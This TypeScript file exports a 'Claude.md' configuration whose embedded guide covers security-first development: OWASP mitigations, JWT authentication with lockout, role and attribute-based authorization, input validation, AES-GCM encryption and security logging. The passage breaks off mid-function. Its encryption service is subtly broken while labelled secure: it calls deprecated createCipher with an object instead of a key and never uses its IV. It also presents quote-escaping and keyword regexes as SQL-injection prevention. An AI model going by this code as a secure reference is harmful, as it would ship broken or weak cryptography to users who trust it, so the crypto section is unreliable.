import { ClaudeMdConfig } from '../types';

export const securityDevelopmentConfigs: ClaudeMdConfig[] = [
  {
    id: 'security-first-development',
    title: 'Security-First Development + OWASP',
    slug: 'security-first-development-owasp-practices',
    description: 'Comprehensive security-first development approach with OWASP guidelines, secure coding practices, vulnerability assessment, and security testing integration.',
    category: 'Claude.md Configurations',
    tags: ['security', 'owasp', 'secure-coding', 'vulnerability-assessment', 'security-testing'],
    difficulty: 'ADVANCED',
    language: 'Multiple',
    framework: 'Security-First Architecture',
    content: `# Claude.md - Security-First Development + OWASP

## Project Overview

This is a comprehensive security-first development setup implementing OWASP guidelines, secure coding practices, automated vulnerability assessment, and security testing throughout the development lifecycle. Focus on building security into every layer of the application architecture.

## Security Philosophy

### Security-First Principles
1. **Security by Design**: Build security into the architecture from the ground up
2. **Defense in Depth**: Implement multiple layers of security controls
3. **Principle of Least Privilege**: Grant minimal access required for functionality
4. **Fail Securely**: Ensure failures don't compromise security
5. **Continuous Security**: Integrate security testing throughout the development cycle

### OWASP Top 10 Mitigation
1. **Broken Access Control**: Implement proper authorization and access controls
2. **Cryptographic Failures**: Use strong encryption and secure key management
3. **Injection**: Prevent SQL, NoSQL, OS, and LDAP injection attacks
4. **Insecure Design**: Follow secure design patterns and threat modeling
5. **Security Misconfiguration**: Implement secure configuration management
6. **Vulnerable Components**: Monitor and update dependencies regularly
7. **Authentication Failures**: Implement robust authentication mechanisms
8. **Software Integrity Failures**: Ensure code and infrastructure integrity
9. **Logging Failures**: Implement comprehensive security logging
10. **Server-Side Request Forgery**: Validate and sanitize server requests

## Technology Stack

- **Security Scanning**: SAST (SonarQube, CodeQL), DAST (OWASP ZAP, Burp Suite)
- **Dependency Scanning**: Snyk, npm audit, OWASP Dependency-Check
- **Authentication**: OAuth 2.0, OpenID Connect, JWT with proper validation
- **Authorization**: RBAC, ABAC, Policy-based access control
- **Encryption**: TLS 1.3, AES-256, RSA-4096, bcrypt, Argon2
- **Infrastructure**: Docker security, Kubernetes security policies, WAF

## Project Structure

\`\`\`
security-first-app/
├── security/
│   ├── policies/            # Security policies and configurations
│   ├── scanning/            # Security scanning configurations
│   ├── monitoring/          # Security monitoring and alerting
│   └── compliance/          # Compliance and audit reports
├── src/
│   ├── auth/               # Authentication and authorization
│   ├── crypto/             # Cryptographic utilities
│   ├── validation/         # Input validation and sanitization
│   ├── logging/            # Security logging
│   └── middleware/         # Security middleware
├── tests/
│   ├── security/           # Security-focused tests
│   ├── penetration/        # Penetration testing scripts
│   └── compliance/         # Compliance validation tests
├── infrastructure/
│   ├── security-policies/  # Infrastructure security policies
│   ├── network/            # Network security configurations
│   └── monitoring/         # Security monitoring setup
└── docs/
    ├── threat-model/       # Threat modeling documentation
    ├── security-guide/     # Security implementation guide
    └── incident-response/  # Incident response procedures
\`\`\`

## Authentication and Authorization

### Secure Authentication Implementation
\`\`\`typescript
// src/auth/authentication.ts
import bcrypt from 'bcrypt';
import jwt from 'jsonwebtoken';
import crypto from 'crypto';
import { rateLimit } from 'express-rate-limit';

export class SecureAuthenticationService {
  private readonly JWT_SECRET: string;
  private readonly JWT_EXPIRY = '15m';
  private readonly REFRESH_TOKEN_EXPIRY = '7d';
  private readonly SALT_ROUNDS = 12;
  private readonly MAX_LOGIN_ATTEMPTS = 5;
  private readonly LOCKOUT_TIME = 15 * 60 * 1000; // 15 minutes

  constructor() {
    this.JWT_SECRET = this.getSecretFromEnv();
    this.validateSecurityRequirements();
  }

  // Rate limiting for authentication endpoints
  public getAuthRateLimit() {
    return rateLimit({
      windowMs: 15 * 60 * 1000, // 15 minutes
      max: 5, // Limit each IP to 5 requests per windowMs
      message: {
        error: 'Too many authentication attempts, please try again later.'
      },
      standardHeaders: true,
      legacyHeaders: false,
      handler: (req, res) => {
        this.logSecurityEvent('RATE_LIMIT_EXCEEDED', {
          ip: req.ip,
          userAgent: req.get('User-Agent'),
          timestamp: new Date().toISOString()
        });
        res.status(429).json({
          error: 'Too many authentication attempts',
          retryAfter: Math.round(15 * 60 * 1000 / 1000)
        });
      }
    });
  }

  async registerUser(email: string, password: string, additionalData: any): Promise<{ success: boolean; userId?: string; errors?: string[] }> {
    const validationErrors = this.validateRegistrationInput(email, password);
    if (validationErrors.length > 0) {
      return { success: false, errors: validationErrors };
    }

    try {
      // Check if user already exists
      const existingUser = await this.findUserByEmail(email);
      if (existingUser) {
        // Don't reveal that user exists (prevent enumeration)
        this.logSecurityEvent('REGISTRATION_ATTEMPT_EXISTING_EMAIL', {
          email: this.hashEmail(email),
          timestamp: new Date().toISOString()
        });
        return { success: false, errors: ['Registration failed'] };
      }

      // Hash password securely
      const hashedPassword = await bcrypt.hash(password, this.SALT_ROUNDS);
      
      // Generate email verification token
      const emailVerificationToken = this.generateSecureToken();
      
      // Create user with secure defaults
      const userId = await this.createUser({
        email: email.toLowerCase().trim(),
        passwordHash: hashedPassword,
        emailVerificationToken,
        emailVerified: false,
        loginAttempts: 0,
        lockedUntil: null,
        createdAt: new Date(),
        ...this.sanitizeUserData(additionalData)
      });

      // Send verification email (implement separately)
      await this.sendEmailVerification(email, emailVerificationToken);

      this.logSecurityEvent('USER_REGISTERED', {
        userId,
        email: this.hashEmail(email),
        timestamp: new Date().toISOString()
      });

      return { success: true, userId };

    } catch (error) {
      this.logSecurityEvent('REGISTRATION_ERROR', {
        error: error.message,
        email: this.hashEmail(email),
        timestamp: new Date().toISOString()
      });
      return { success: false, errors: ['Registration failed'] };
    }
  }

  async authenticateUser(email: string, password: string, userAgent?: string, ipAddress?: string): Promise<AuthResult> {
    try {
      const user = await this.findUserByEmail(email);
      
      if (!user) {
        // Prevent timing attacks by still computing hash
        await bcrypt.hash('dummy_password', this.SALT_ROUNDS);
        this.logSecurityEvent('LOGIN_ATTEMPT_INVALID_EMAIL', {
          email: this.hashEmail(email),
          ipAddress,
          userAgent,
          timestamp: new Date().toISOString()
        });
        return { success: false, error: 'Invalid credentials' };
      }

      // Check if account is locked
      if (user.lockedUntil && user.lockedUntil > new Date()) {
        this.logSecurityEvent('LOGIN_ATTEMPT_LOCKED_ACCOUNT', {
          userId: user.id,
          ipAddress,
          userAgent,
          timestamp: new Date().toISOString()
        });
        return { success: false, error: 'Account temporarily locked' };
      }

      // Check if email is verified
      if (!user.emailVerified) {
        return { success: false, error: 'Email not verified' };
      }

      // Verify password
      const isPasswordValid = await bcrypt.compare(password, user.passwordHash);
      
      if (!isPasswordValid) {
        await this.handleFailedLogin(user.id);
        this.logSecurityEvent('LOGIN_ATTEMPT_INVALID_PASSWORD', {
          userId: user.id,
          ipAddress,
          userAgent,
          timestamp: new Date().toISOString()
        });
        return { success: false, error: 'Invalid credentials' };
      }

      // Reset login attempts on successful login
      await this.resetLoginAttempts(user.id);

      // Generate secure tokens
      const accessToken = this.generateAccessToken(user);
      const refreshToken = this.generateRefreshToken(user.id);
      
      // Store refresh token securely
      await this.storeRefreshToken(user.id, refreshToken, ipAddress, userAgent);

      this.logSecurityEvent('LOGIN_SUCCESS', {
        userId: user.id,
        ipAddress,
        userAgent,
        timestamp: new Date().toISOString()
      });

      return {
        success: true,
        accessToken,
        refreshToken,
        user: this.sanitizeUserForClient(user)
      };

    } catch (error) {
      this.logSecurityEvent('LOGIN_ERROR', {
        error: error.message,
        email: this.hashEmail(email),
        ipAddress,
        userAgent,
        timestamp: new Date().toISOString()
      });
      return { success: false, error: 'Authentication failed' };
    }
  }

  // JWT token validation with security checks
  async validateAccessToken(token: string): Promise<{ valid: boolean; payload?: any; error?: string }> {
    try {
      // Verify JWT signature and expiration
      const decoded = jwt.verify(token, this.JWT_SECRET, {
        algorithms: ['HS256'],
        issuer: process.env.JWT_ISSUER,
        audience: process.env.JWT_AUDIENCE
      }) as any;

      // Additional security checks
      if (!decoded.sub || !decoded.iat || !decoded.exp) {
        return { valid: false, error: 'Invalid token structure' };
      }

      // Check if user still exists and is active
      const user = await this.findUserById(decoded.sub);
      if (!user || !user.active) {
        return { valid: false, error: 'User not found or inactive' };
      }

      // Check if token was issued before user's last password change
      if (user.passwordChangedAt && decoded.iat < Math.floor(user.passwordChangedAt.getTime() / 1000)) {
        return { valid: false, error: 'Token invalidated by password change' };
      }

      return { valid: true, payload: decoded };

    } catch (error) {
      if (error.name === 'JsonWebTokenError') {
        return { valid: false, error: 'Invalid token' };
      } else if (error.name === 'TokenExpiredError') {
        return { valid: false, error: 'Token expired' };
      } else {
        this.logSecurityEvent('TOKEN_VALIDATION_ERROR', {
          error: error.message,
          timestamp: new Date().toISOString()
        });
        return { valid: false, error: 'Token validation failed' };
      }
    }
  }

  private validateRegistrationInput(email: string, password: string): string[] {
    const errors: string[] = [];

    // Email validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!email || !emailRegex.test(email)) {
      errors.push('Invalid email format');
    }

    // Password strength validation
    if (!password || password.length < 12) {
      errors.push('Password must be at least 12 characters long');
    }

    if (!/(?=.*[a-z])/.test(password)) {
      errors.push('Password must contain at least one lowercase letter');
    }

    if (!/(?=.*[A-Z])/.test(password)) {
      errors.push('Password must contain at least one uppercase letter');
    }

    if (!/(?=.*\d)/.test(password)) {
      errors.push('Password must contain at least one number');
    }

    if (!/(?=.*[!@#$%^&*])/.test(password)) {
      errors.push('Password must contain at least one special character');
    }

    // Check against common passwords (implement password blacklist)
    if (this.isCommonPassword(password)) {
      errors.push('Password is too common, please choose a stronger password');
    }

    return errors;
  }

  private generateAccessToken(user: any): string {
    const payload = {
      sub: user.id,
      email: user.email,
      roles: user.roles || [],
      permissions: user.permissions || [],
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + (15 * 60), // 15 minutes
      iss: process.env.JWT_ISSUER,
      aud: process.env.JWT_AUDIENCE
    };

    return jwt.sign(payload, this.JWT_SECRET, { algorithm: 'HS256' });
  }

  private generateRefreshToken(userId: string): string {
    return crypto.randomBytes(64).toString('hex');
  }

  private generateSecureToken(): string {
    return crypto.randomBytes(32).toString('hex');
  }

  private async handleFailedLogin(userId: string): Promise<void> {
    const user = await this.findUserById(userId);
    if (!user) return;

    const attempts = (user.loginAttempts || 0) + 1;
    
    if (attempts >= this.MAX_LOGIN_ATTEMPTS) {
      const lockedUntil = new Date(Date.now() + this.LOCKOUT_TIME);
      await this.lockUserAccount(userId, lockedUntil);
      
      this.logSecurityEvent('ACCOUNT_LOCKED', {
        userId,
        attempts,
        lockedUntil: lockedUntil.toISOString(),
        timestamp: new Date().toISOString()
      });
    } else {
      await this.incrementLoginAttempts(userId, attempts);
    }
  }

  private getSecretFromEnv(): string {
    const secret = process.env.JWT_SECRET;
    if (!secret || secret.length < 32) {
      throw new Error('JWT_SECRET must be at least 32 characters long');
    }
    return secret;
  }

  private validateSecurityRequirements(): void {
    // Ensure HTTPS in production
    if (process.env.NODE_ENV === 'production' && !process.env.FORCE_HTTPS) {
      throw new Error('HTTPS is required in production');
    }

    // Validate environment variables
    const requiredEnvVars = ['JWT_SECRET', 'JWT_ISSUER', 'JWT_AUDIENCE'];
    for (const envVar of requiredEnvVars) {
      if (!process.env[envVar]) {
        throw new Error(\`Required environment variable \${envVar} is not set\`);
      }
    }
  }

  private logSecurityEvent(event: string, data: any): void {
    const logEntry = {
      event,
      data,
      timestamp: new Date().toISOString(),
      severity: this.getEventSeverity(event)
    };

    console.log('SECURITY_EVENT:', JSON.stringify(logEntry));
    
    // Send to security monitoring system
    this.sendToSecurityMonitoring(logEntry);
  }

  private getEventSeverity(event: string): 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL' {
    const highSeverityEvents = ['ACCOUNT_LOCKED', 'LOGIN_ATTEMPT_LOCKED_ACCOUNT'];
    const mediumSeverityEvents = ['LOGIN_ATTEMPT_INVALID_PASSWORD', 'RATE_LIMIT_EXCEEDED'];
    
    if (highSeverityEvents.includes(event)) return 'HIGH';
    if (mediumSeverityEvents.includes(event)) return 'MEDIUM';
    return 'LOW';
  }

  private hashEmail(email: string): string {
    return crypto.createHash('sha256').update(email).digest('hex');
  }

  private isCommonPassword(password: string): boolean {
    // Implement check against common password list
    const commonPasswords = ['password123', '123456789', 'qwerty123'];
    return commonPasswords.includes(password.toLowerCase());
  }

  private sanitizeUserData(data: any): any {
    // Remove sensitive fields and validate input
    const allowedFields = ['firstName', 'lastName', 'phoneNumber'];
    const sanitized: any = {};
    
    for (const field of allowedFields) {
      if (data[field]) {
        sanitized[field] = this.sanitizeInput(data[field]);
      }
    }
    
    return sanitized;
  }

  private sanitizeInput(input: string): string {
    // Basic input sanitization
    return input.trim().replace(/[<>\"']/g, '');
  }

  private sanitizeUserForClient(user: any): any {
    const { passwordHash, emailVerificationToken, loginAttempts, lockedUntil, ...safeUser } = user;
    return safeUser;
  }

  // Placeholder methods - implement based on your database
  private async findUserByEmail(email: string): Promise<any> { /* Implementation */ }
  private async findUserById(id: string): Promise<any> { /* Implementation */ }
  private async createUser(userData: any): Promise<string> { /* Implementation */ }
  private async resetLoginAttempts(userId: string): Promise<void> { /* Implementation */ }
  private async incrementLoginAttempts(userId: string, attempts: number): Promise<void> { /* Implementation */ }
  private async lockUserAccount(userId: string, lockedUntil: Date): Promise<void> { /* Implementation */ }
  private async storeRefreshToken(userId: string, token: string, ipAddress?: string, userAgent?: string): Promise<void> { /* Implementation */ }
  private async sendEmailVerification(email: string, token: string): Promise<void> { /* Implementation */ }
  private async sendToSecurityMonitoring(logEntry: any): Promise<void> { /* Implementation */ }
}

interface AuthResult {
  success: boolean;
  accessToken?: string;
  refreshToken?: string;
  user?: any;
  error?: string;
}
\`\`\`

### Authorization and Access Control
\`\`\`typescript
// src/auth/authorization.ts
export class AuthorizationService {
  private permissions: Map<string, Set<string>> = new Map();
  private roleHierarchy: Map<string, string[]> = new Map();

  constructor() {
    this.initializeRoleBasedAccess();
  }

  private initializeRoleBasedAccess(): void {
    // Define role hierarchy
    this.roleHierarchy.set('admin', ['admin', 'manager', 'user']);
    this.roleHierarchy.set('manager', ['manager', 'user']);
    this.roleHierarchy.set('user', ['user']);

    // Define permissions for each role
    this.permissions.set('admin', new Set([
      'users:read', 'users:write', 'users:delete',
      'system:config', 'system:logs', 'system:monitoring'
    ]));
    
    this.permissions.set('manager', new Set([
      'users:read', 'users:write',
      'reports:read', 'reports:write'
    ]));
    
    this.permissions.set('user', new Set([
      'profile:read', 'profile:write',
      'data:read'
    ]));
  }

  // Check if user has required permission
  hasPermission(userRoles: string[], requiredPermission: string): boolean {
    for (const role of userRoles) {
      const rolePermissions = this.permissions.get(role);
      if (rolePermissions && rolePermissions.has(requiredPermission)) {
        return true;
      }
    }
    return false;
  }

  // Check if user has required role or higher
  hasRole(userRoles: string[], requiredRole: string): boolean {
    const allowedRoles = this.roleHierarchy.get(requiredRole);
    if (!allowedRoles) return false;

    return userRoles.some(role => allowedRoles.includes(role));
  }

  // Middleware for permission-based access control
  requirePermission(permission: string) {
    return (req: any, res: any, next: any) => {
      const user = req.user;
      if (!user) {
        return res.status(401).json({ error: 'Authentication required' });
      }

      if (!this.hasPermission(user.roles || [], permission)) {
        this.logSecurityEvent('ACCESS_DENIED', {
          userId: user.id,
          requiredPermission: permission,
          userRoles: user.roles,
          resource: req.path,
          method: req.method,
          timestamp: new Date().toISOString()
        });

        return res.status(403).json({ error: 'Insufficient permissions' });
      }

      next();
    };
  }

  // Middleware for role-based access control
  requireRole(role: string) {
    return (req: any, res: any, next: any) => {
      const user = req.user;
      if (!user) {
        return res.status(401).json({ error: 'Authentication required' });
      }

      if (!this.hasRole(user.roles || [], role)) {
        this.logSecurityEvent('ACCESS_DENIED', {
          userId: user.id,
          requiredRole: role,
          userRoles: user.roles,
          resource: req.path,
          method: req.method,
          timestamp: new Date().toISOString()
        });

        return res.status(403).json({ error: 'Insufficient role' });
      }

      next();
    };
  }

  // Attribute-based access control (ABAC)
  checkAccess(user: any, resource: any, action: string, context: any = {}): boolean {
    // Implement complex business logic for access control
    const policy = this.getAccessPolicy(resource.type, action);
    return this.evaluatePolicy(policy, user, resource, context);
  }

  private getAccessPolicy(resourceType: string, action: string): any {
    // Define access policies
    const policies = {
      'document': {
        'read': (user: any, resource: any, context: any) => {
          // Owner can always read
          if (resource.ownerId === user.id) return true;
          
          // Public documents can be read by anyone
          if (resource.visibility === 'public') return true;
          
          // Shared documents can be read by specified users
          if (resource.sharedWith && resource.sharedWith.includes(user.id)) return true;
          
          return false;
        },
        'write': (user: any, resource: any, context: any) => {
          // Only owner can write
          if (resource.ownerId === user.id) return true;
          
          // Users with write permission can write
          if (resource.permissions && resource.permissions[user.id] === 'write') return true;
          
          return false;
        }
      }
    };

    return policies[resourceType]?.[action];
  }

  private evaluatePolicy(policy: Function, user: any, resource: any, context: any): boolean {
    if (!policy) return false;
    
    try {
      return policy(user, resource, context);
    } catch (error) {
      this.logSecurityEvent('POLICY_EVALUATION_ERROR', {
        error: error.message,
        userId: user.id,
        resourceId: resource.id,
        timestamp: new Date().toISOString()
      });
      return false;
    }
  }

  private logSecurityEvent(event: string, data: any): void {
    console.log('AUTHORIZATION_EVENT:', JSON.stringify({ event, data }));
  }
}
\`\`\`

## Input Validation and Sanitization

### Comprehensive Input Validation
\`\`\`typescript
// src/validation/input-validator.ts
import validator from 'validator';
import DOMPurify from 'isomorphic-dompurify';

export class InputValidator {
  private static readonly MAX_STRING_LENGTH = 10000;
  private static readonly MAX_ARRAY_LENGTH = 1000;
  private static readonly MAX_OBJECT_DEPTH = 10;

  // SQL Injection Prevention
  static validateSQLInput(input: string): { valid: boolean; sanitized: string; errors: string[] } {
    const errors: string[] = [];
    let sanitized = input;

    // Check for SQL injection patterns
    const sqlInjectionPatterns = [
      /('|(\\')|(;)|(--)|(\s*(union|select|insert|update|delete|drop|create|alter|exec|execute)\s+)/gi,
      /(script|javascript|vbscript|onload|onerror|onclick)/gi
    ];

    for (const pattern of sqlInjectionPatterns) {
      if (pattern.test(input)) {
        errors.push('Input contains potentially dangerous SQL patterns');
        break;
      }
    }

    // Escape single quotes for SQL
    sanitized = sanitized.replace(/'/g, "''");

    return {
      valid: errors.length === 0,
      sanitized,
      errors
    };
  }

  // XSS Prevention
  static validateAndSanitizeHTML(input: string): { valid: boolean; sanitized: string; errors: string[] } {
    const errors: string[] = [];

    // Check for script tags and javascript protocols
    const xssPatterns = [
      /<script[^>]*>.*?<\/script>/gi,
      /javascript:/gi,
      /on\w+\s*=/gi,
      /<iframe[^>]*>.*?<\/iframe>/gi
    ];

    for (const pattern of xssPatterns) {
      if (pattern.test(input)) {
        errors.push('Input contains potentially dangerous XSS patterns');
        break;
      }
    }

    // Sanitize HTML
    const sanitized = DOMPurify.sanitize(input, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br', 'ul', 'ol', 'li'],
      ALLOWED_ATTR: []
    });

    return {
      valid: errors.length === 0,
      sanitized,
      errors
    };
  }

  // NoSQL Injection Prevention
  static validateNoSQLInput(input: any): { valid: boolean; sanitized: any; errors: string[] } {
    const errors: string[] = [];
    let sanitized = input;

    if (typeof input === 'object' && input !== null) {
      // Check for MongoDB injection patterns
      const dangerousKeys = ['$where', '$ne', '$in', '$nin', '$or', '$and', '$nor', '$regex'];
      
      const checkObject = (obj: any, depth = 0): boolean => {
        if (depth > this.MAX_OBJECT_DEPTH) {
          errors.push('Object nesting too deep');
          return false;
        }

        for (const key in obj) {
          if (dangerousKeys.includes(key)) {
            errors.push(\`Dangerous NoSQL operator detected: \${key}\`);
            return false;
          }

          if (typeof obj[key] === 'object' && obj[key] !== null) {
            if (!checkObject(obj[key], depth + 1)) {
              return false;
            }
          }
        }
        return true;
      };

      if (!checkObject(input)) {
        sanitized = {};
      }
    }

    return {
      valid: errors.length === 0,
      sanitized,
      errors
    };
  }

  // Comprehensive input validation
  static validateUserInput(input: any, schema: ValidationSchema): ValidationResult {
    const errors: string[] = [];
    const sanitized: any = {};

    for (const [field, rules] of Object.entries(schema.fields)) {
      const value = input[field];
      const fieldResult = this.validateField(value, rules, field);
      
      if (!fieldResult.valid) {
        errors.push(...fieldResult.errors);
      } else {
        sanitized[field] = fieldResult.sanitized;
      }
    }

    return {
      valid: errors.length === 0,
      sanitized,
      errors
    };
  }

  private static validateField(value: any, rules: FieldRules, fieldName: string): ValidationResult {
    const errors: string[] = [];
    let sanitized = value;

    // Required check
    if (rules.required && (value === undefined || value === null || value === '')) {
      errors.push(\`\${fieldName} is required\`);
      return { valid: false, sanitized: null, errors };
    }

    // Skip further validation if not required and empty
    if (!rules.required && (value === undefined || value === null || value === '')) {
      return { valid: true, sanitized: null, errors: [] };
    }

    // Type validation
    if (rules.type && typeof value !== rules.type) {
      errors.push(\`\${fieldName} must be of type \${rules.type}\`);
      return { valid: false, sanitized: value, errors };
    }

    // String validations
    if (typeof value === 'string') {
      if (rules.minLength && value.length < rules.minLength) {
        errors.push(\`\${fieldName} must be at least \${rules.minLength} characters long\`);
      }

      if (rules.maxLength && value.length > rules.maxLength) {
        errors.push(\`\${fieldName} must be no more than \${rules.maxLength} characters long\`);
      }

      if (rules.pattern && !rules.pattern.test(value)) {
        errors.push(\`\${fieldName} format is invalid\`);
      }

      // Sanitize string
      sanitized = value.trim();
      
      if (rules.sanitizeHTML) {
        const htmlResult = this.validateAndSanitizeHTML(sanitized);
        sanitized = htmlResult.sanitized;
        if (!htmlResult.valid) {
          errors.push(...htmlResult.errors);
        }
      }
    }

    // Number validations
    if (typeof value === 'number') {
      if (rules.min !== undefined && value < rules.min) {
        errors.push(\`\${fieldName} must be at least \${rules.min}\`);
      }

      if (rules.max !== undefined && value > rules.max) {
        errors.push(\`\${fieldName} must be no more than \${rules.max}\`);
      }
    }

    // Array validations
    if (Array.isArray(value)) {
      if (rules.maxItems && value.length > rules.maxItems) {
        errors.push(\`\${fieldName} must have no more than \${rules.maxItems} items\`);
      }

      if (rules.minItems && value.length < rules.minItems) {
        errors.push(\`\${fieldName} must have at least \${rules.minItems} items\`);
      }
    }

    // Email validation
    if (rules.email && !validator.isEmail(value)) {
      errors.push(\`\${fieldName} must be a valid email address\`);
    }

    // URL validation
    if (rules.url && !validator.isURL(value)) {
      errors.push(\`\${fieldName} must be a valid URL\`);
    }

    return {
      valid: errors.length === 0,
      sanitized,
      errors
    };
  }
}

// Validation middleware
export function validateInput(schema: ValidationSchema) {
  return (req: any, res: any, next: any) => {
    const result = InputValidator.validateUserInput(req.body, schema);
    
    if (!result.valid) {
      return res.status(400).json({
        error: 'Validation failed',
        details: result.errors
      });
    }

    req.validatedBody = result.sanitized;
    next();
  };
}

interface ValidationSchema {
  fields: { [key: string]: FieldRules };
}

interface FieldRules {
  type?: 'string' | 'number' | 'boolean' | 'object';
  required?: boolean;
  minLength?: number;
  maxLength?: number;
  min?: number;
  max?: number;
  pattern?: RegExp;
  email?: boolean;
  url?: boolean;
  sanitizeHTML?: boolean;
  maxItems?: number;
  minItems?: number;
}

interface ValidationResult {
  valid: boolean;
  sanitized: any;
  errors: string[];
}
\`\`\`

## Cryptographic Security

### Secure Encryption Service
\`\`\`typescript
// src/crypto/encryption-service.ts
import crypto from 'crypto';
import { promisify } from 'util';

export class EncryptionService {
  private readonly ALGORITHM = 'aes-256-gcm';
  private readonly KEY_LENGTH = 32; // 256 bits
  private readonly IV_LENGTH = 16;  // 128 bits
  private readonly SALT_LENGTH = 32; // 256 bits
  private readonly TAG_LENGTH = 16; // 128 bits
  private readonly ITERATIONS = 100000; // PBKDF2 iterations

  // Encrypt data with AES-256-GCM
  encrypt(plaintext: string, password?: string): EncryptionResult {
    try {
      const key = password ? this.deriveKey(password) : this.generateKey();
      const iv = crypto.randomBytes(this.IV_LENGTH);
      
      const cipher = crypto.createCipher(this.ALGORITHM, key);
      cipher.setAAD(Buffer.from('authenticated-data'));
      
      let encrypted = cipher.update(plaintext, 'utf8', 'hex');
      encrypted += cipher.final('hex');
      
      const tag = cipher.getAuthTag();
      
      const result = {
        encrypted,
        iv: iv.toString('hex'),
        tag: tag.toString('hex'),
        salt: key.salt?.toString('hex'),
        algorithm: this.ALGORITHM
      };

      return result;
    } catch (error) {
      throw new Error(\`Encryption failed: \${error.message}\`);
    }
  }

  // Decrypt data with AES-256-GCM
  decrypt(encryptionResult: EncryptionResult, password?: string): string {
    try {
      const key = password && encryptionResult.salt 
        ? this.deriveKeyFromSalt(password, Buffer.from(encryptionResult.salt, 'hex'))
        : this.getStoredKey(); // Implement key retrieval

      const decipher = crypto.createDecipher(encryptionResult.algorithm, key.key);
      decipher.setAAD(Buffer.from('authenticated-data'));
      decipher.setAuthTag(Buffer.from(encryptionResult.tag, 'hex'));
      
      let decrypted = decipher.update(encryptionResult.encrypted, 'hex', 'utf8');
      decrypted += decipher.final('utf8');
      
      return decrypted;
    } catch (error) {
      throw new Error(\`Decryption failed: \${error.message}\`);
    }
  }

  // Hash passwords securely
  async hashPassword(password: string): Promise<PasswordHash> {
    const salt = crypto.randomBytes(this.SALT_LENGTH);
    const hash = await promisify(crypto.pbkdf2)(password, salt, this.ITERATIONS, 64, 'sha512');
    
    return {
      hash: hash.toString('hex'),
      salt: salt.toString('hex'),
      iterations: this.ITERATIONS,
      algorithm: 'pbkdf2-sha512'
    };
  }

  // Verify password against hash
  async verifyPassword(password: string, passwordHash: PasswordHash): Promise<boolean> {
    try {
      const salt = Buffer.from(passwordHash.salt, 'hex');
      const hash = await promisify(crypto.pbkdf2)(
        password, 
        salt, 
        passwordHash.iterations, 
        64, 
        'sha512'
      );
      
      return crypto.timingSafeEqual(
        Buffer.from(passwordHash.hash, 'hex'),
        hash
      );
    } catch (error) {
      return false;
    }
  }

  // Generate cryptographically secure random tokens
  generateSecureToken(length: number = 32): string {
    return crypto.randomBytes(length).toString('hex');
  }

  // Generate HMAC for data integrity
  generateHMAC(data: string, secret: string): string {
    return crypto.createHmac('sha256', secret).update(data).digest('hex');
  }

  // Verify HMAC
  verifyHMAC(data: string, secret: string, expectedHmac: string): boolean {
    const computedHmac = this.generateHMAC(data, secret);
    return crypto.timingSafeEqual(
      Buffer.from(expectedHmac, 'hex'),
      Buffer.from(computedHmac, 'hex')
    );
  }

  // Key derivation from password
  private deriveKey(password: string): { key: Buffer; salt: Buffer } {
    const salt = crypto.randomBytes(this.SALT_LENGTH);
    const key = crypto.pbkdf2Sync(password, salt, this.ITERATIONS, this.KEY_LENGTH, 'sha256');
    return { key, salt };
  }

  private deriveKeyFromSalt(password: string, salt: Buffer): { key: Buffer; salt: Buffer } {
    const key = crypto.pbkdf2Sync(password, salt, this.ITERATIONS, this.KEY_LENGTH, 'sha256');
    return { key, salt };
  }

  // Generate random encryption key
  private generateKey(): { key: Buffer; salt?: Buffer } {
    return { key: crypto.randomBytes(this.KEY_LENGTH) };
  }

  private getStoredKey(): { key: Buffer } {
    // Implement secure key storage/retrieval
    const keyFromEnv = process.env.ENCRYPTION_KEY;
    if (!keyFromEnv) {
      throw new Error('Encryption key not found');
    }
    return { key: Buffer.from(keyFromEnv, 'hex') };
  }
}

interface EncryptionResult {
  encrypted: string;
  iv: string;
  tag: string;
  salt?: string;
  algorithm: string;
}

interface PasswordHash {
  hash: string;
  salt: string;
  iterations: number;
  algorithm: string;
}
\`\`\`

## Security Monitoring and Logging

### Security Event Logger
\`\`\`typescript
// src/logging/security-logger.ts
import winston from 'winston';
import { ElasticsearchTransport } from 'winston-elasticsearch';

export class SecurityLogger {
  private logger: winston.Logger;
  private alertThresholds: Map<string, AlertConfig> = new Map();

  constructor() {
    this.initializeLogger();
    this.setupAlertThresholds();
  }

  private initializeLogger(): void {
    const transports: winston.transport[] = [
      new winston.transports.Console({
        format: winston.format.combine(
          winston.format.timestamp(),
          winston.format.colorize(),
          winston.format.printf(({ level, message, timestamp, ...meta }) => {
            return \`\${timestamp} [\${level}]: \${message} \${Object.keys(meta).length ? JSON.stringify(meta, null, 2) : ''}\`;
          })
        )
      }),
      new winston.transports.File({
        filename: 'logs/security.log',
        format: winston.format.combine(
          winston.format.timestamp(),
          winston.format.json()
        )
      })
    ];

    // Add Elasticsearch transport for production
    if (process.env.NODE_ENV === 'production' && process.env.ELASTICSEARCH_URL) {
      transports.push(new ElasticsearchTransport({
        level: 'info',
        clientOpts: { node: process.env.ELASTICSEARCH_URL },
        index: 'security-logs'
      }));
    }

    this.logger = winston.createLogger({
      level: 'info',
      format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.errors({ stack: true }),
        winston.format.json()
      ),
      transports
    });
  }

  private setupAlertThresholds(): void {
    this.alertThresholds.set('FAILED_LOGIN', {
      count: 5,
      timeWindow: 5 * 60 * 1000, // 5 minutes
      severity: 'MEDIUM'
    });

    this.alertThresholds.set('SQL_INJECTION_ATTEMPT', {
      count: 1,
      timeWindow: 60 * 1000, // 1 minute
      severity: 'HIGH'
    });

    this.alertThresholds.set('XSS_ATTEMPT', {
      count: 3,
      timeWindow: 5 * 60 * 1000,
      severity: 'HIGH'
    });
  }

  logSecurityEvent(event: SecurityEvent): void {
    const logEntry = {
      ...event,
      timestamp: new Date().toISOString(),
      severity: this.calculateSeverity(event),
      source: 'security-system'
    };

    // Log the event
    switch (logEntry.severity) {
      case 'CRITICAL':
        this.logger.error('SECURITY_EVENT', logEntry);
        break;
      case 'HIGH':
        this.logger.warn('SECURITY_EVENT', logEntry);
        break;
      default:
        this.logger.info('SECURITY_EVENT', logEntry);
    }

    // Check if we need to trigger alerts
    this.checkAlertThresholds(event);

    // Send to security monitoring system
    this.sendToSIEM(logEntry);
  }

  private calculateSeverity(event: SecurityEvent): Severity {
    const highSeverityEvents = [
      'SQL_INJECTION_ATTEMPT',
      'XSS_ATTEMPT',
      'PRIVILEGE_ESCALATION',
      'DATA_BREACH',
      'SYSTEM_COMPROMISE'
    ];

